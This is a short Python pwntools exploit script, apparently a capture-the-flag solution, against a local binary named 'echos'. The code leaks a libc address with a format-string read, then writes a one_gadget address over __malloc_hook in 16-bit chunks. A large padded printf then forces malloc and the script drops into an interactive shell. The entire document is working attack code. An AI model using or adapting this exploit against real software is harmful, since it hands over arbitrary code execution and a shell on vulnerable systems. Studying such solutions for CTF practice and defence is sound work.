from pwn import *

def _16bit_split(num):
    """
    Splits a number in 3 16-bit parts.
    (Only 3 because an x64-address is only
    48-bits long).
    """
    for _ in range(3):
        yield num & 0xffff
        num >>= 16
        
def generate_fmt_string(num):
    """
    Given a number `num` generates a format-string
    that writes that number to a certain address
    stored in the 13th printf-argument.
    """
    parts = dict(enumerate(_16bit_split(num)))
    have_already = 0
    fmt_string = ""

    for key in sorted(parts, key=lambda e: parts[e]):
        part = parts[key] - have_already
        assert(part != 0)
        fmt_string += f"%{part}d%{13 + key}$hn"
        have_already += part
    
    return fmt_string.ljust(40, "\x00")

conn = process('./echos',env={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'})
conn.sendline("%19$lx")
ret_main = int(conn.recvline()[:-1].decode(), 16)
libc_base = ret_main - 0x21b97
log.info(f"Libc @ {hex(libc_base)}")

one_gadget = libc_base + 0x10a38c
malloc_hook = libc_base + 0x3ebc30

log.info(f"one_gadget @ {hex(one_gadget)}")

fmt_string = generate_fmt_string(one_gadget).encode()
fmt_string += p64(malloc_hook)
fmt_string += p64(malloc_hook + 2)
fmt_string += p64(malloc_hook + 4)[:-1]
assert(len(fmt_string) == 63)
conn.send(fmt_string)
conn.sendline("%65510c")
conn.interactive()